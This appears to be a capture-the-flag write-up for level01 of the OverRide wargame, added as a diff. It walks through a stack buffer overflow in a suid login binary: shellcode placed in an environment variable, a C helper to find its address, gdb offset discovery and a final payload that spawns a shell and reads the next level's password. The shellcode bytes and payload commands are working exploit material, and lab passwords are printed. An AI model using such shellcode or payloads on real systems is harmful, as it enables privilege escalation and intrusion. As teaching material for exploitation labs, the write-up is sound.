@@ -1,0 +1,74 @@
+Authenticating as level01/uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
+
+We come across a suid binary named level01.
+
+The program seems to be asking for a username and password. After analysing the assembly of the functions
+that verify both the username and password.
+
+We get that the username is 'dat_wil'
+
+But the interesting part is in the main function where there's vulnerable fgets that reads 256bytes and store it
+into a global variable a_user_name. We exploit that by overwriting the esp and point it to a shellcode that is stored in
+the environment variables as follow.
+
+level01@OverRide:~$  export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+The next step is to get it's address using this function
+level01@OverRide:~$ cat > /tmp/getv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+        printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+
+And don't forget to compile it with -m32 argument to get 32bit address.
+level01@OverRide:~$ gcc -m32 /tmp/getv.c -o /tmp/a
+level01@OverRide:~$ /tmp/a SHELLCODE
+SHELLCODE is at 0xffffd881 <===== Here's the address that points to the beginning of the shellcode in env
+
+Now we need to get the offset of the esp. Using Buffer overflow pattern generator.
+level01@OverRide:~$ gdb level01
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? () <<==== Offset is 80
+(gdb)
+
+Now we are ready to generate our payload
+
+level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A'*80 + '\x81\xd8\xff\xff'" > /tmp/as
+level01@OverRide:~$ cat /tmp/as - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cd /home/users/level02
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+And Here it is, the password for level02.
